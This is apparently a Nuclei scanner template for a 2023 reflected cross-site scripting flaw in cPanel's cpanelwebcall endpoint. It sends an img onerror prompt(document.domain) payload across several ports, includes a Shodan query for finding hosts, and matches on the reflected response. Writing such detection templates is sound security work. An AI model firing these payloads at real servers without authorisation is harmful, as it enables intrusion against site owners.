id: cPanel-xss

info:
  name: cPanel - Cross-Site Scripting
  author: H1NTR0X01
  severity: medium
  reference: https://blog.assetnote.io/2023/04/26/xss-million-websites-cpanel/
  metadata:
    verified: "true"
    shodan-query: title:"cPanel"
  tags: cve,cve2023,cpanel,xss

http:
  - method: GET
    path:
      - '{{BaseURL}}:2083/cpanelwebcall/<img%20src=x%20onerror="prompt(document.domain)">h1ntr0x01'
      - '{{BaseURL}}:2082/cpanelwebcall/<img%20src=x%20onerror="prompt(document.domain)">h1ntr0x01'
      - '{{BaseURL}}:2086/cpanelwebcall/<img%20src=x%20onerror="prompt(document.domain)">h1ntr0x01'
      - '{{BaseURL}}/cpanelwebcall/<img%20src=x%20onerror="prompt(document.domain)">h1ntr0x01'
      - '{{BaseURL}}:80/cpanelwebcall/<img%20src=x%20onerror="prompt(document.domain)">h1ntr0x01'

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '<img src=x onerror="prompt(document.domain)">h1ntr0x01'
          - 'Invalid webcall ID:'
        condition: and

      - type: status
        status:
          - 400
